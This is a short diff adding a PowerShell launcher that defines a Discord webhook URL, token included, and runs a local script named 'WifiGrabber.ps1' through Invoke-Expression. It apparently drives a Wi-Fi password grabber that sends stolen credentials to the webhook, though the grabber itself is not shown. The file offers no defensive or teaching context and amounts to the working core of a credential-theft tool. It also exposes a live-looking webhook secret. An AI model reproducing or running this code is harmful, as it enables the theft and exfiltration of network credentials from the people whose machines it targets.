@@ -1,0 +1,4 @@
+$dc='https://discord.com/api/webhooks/1262881667228500030/DL8QXiRzV9FA_ogQcmWdbFOz0oshAEPG94soYeC9IEQe4tCsvyTg73zC0Cz2qF4av4Ky';
+$db='';
+$localFilePath = "C:\Users\farde\Downloads\Wifi-Grabber\WifiGrabber.ps1" 
+Get-Content $localFilePath | Invoke-Expression
